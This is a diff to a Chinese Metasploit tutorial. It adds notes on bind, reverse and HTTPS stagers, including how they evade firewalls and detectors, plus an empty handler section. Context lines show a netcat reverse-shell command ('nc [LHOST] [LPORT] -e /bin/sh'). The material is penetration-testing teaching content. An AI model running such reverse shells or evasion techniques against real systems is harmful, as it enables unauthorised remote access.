@@ -61,6 +61,9 @@ MSF 中的载荷(payload)共有以下三种:
 
 - Singles: 包含完整的功能, 不依赖 MSF, 因此不需要通过 exploit/multi/handler 来建立连接.
 - Stagers: 小巧可靠, 用于建立连接并接收 Stages.
+  - bind: 正向连接, MSF 主动尝试与目标中的 stager 建立连接.
+  - reverse: 反向连接, 目标中的 stager 尝试与 MSF 连接. 可以绕过部分防火墙规则.
+  - https: 伪装成正常 HTTPS 流量进行通讯. 可以绕过部分防火墙规则并防止被探测器识别.
 - Stages: 无大小限制, 包含高级功能.
 
 在遇见 "载荷" 一词时应结合上下文推断具体含义.  
@@ -88,6 +91,14 @@ nc [LHOST] [LPORT] -e /bin/sh
 ```
 
 选择 shell_reverse_tcp 作为载荷并建立连接.  
+
+## 建立连接
+
+使用 handler 来与目标中的 stager 建立连接, 并上传 stage.  
+
+```sh
+
+```
 
 ## [Meterpreter](https://github.com/rapid7/metasploit-payloads)
 
